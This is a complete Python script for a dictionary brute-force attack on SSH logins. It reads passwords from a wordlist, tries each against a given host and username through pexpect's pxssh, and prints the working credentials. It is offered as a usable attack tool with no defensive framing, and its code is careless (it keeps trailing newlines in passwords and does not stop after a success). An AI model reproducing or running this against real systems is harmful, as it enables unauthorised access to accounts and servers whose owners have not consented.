#!/usr/bin/python3
#author : n00B@khan Team

#import pdb
from sys import argv
from pexpect import pxssh


GREEN = "\033[32m"
YELLOW = "\033[93m" 
none = "\033[0m"

if len(argv)!= 4:
    print(YELLOW + "[!]Usage: {} [HOST] [USERNAME] [DICT]".format(argv[0]))
    print(none + "\n")
    exit()

host = argv[1]
username = argv[2]
password = argv[3]

passwords = open(password, 'r')

def run(host , username , passwords):
    for pwd in passwords:
        try:
                print(YELLOW+'[*]--------' + pwd + none )
                #pdb.set_trace()
                ssh = pxssh.pxssh()
                ssh.login(host , username , pwd)
                print("login sucess HOST :"+GREEN+ host + none + "  USERNAME :"+GREEN+username+none + "  password :"+GREEN+ pwd + none)
        except Exception as e:
            print(e)
            pass


run(host , username , passwords)
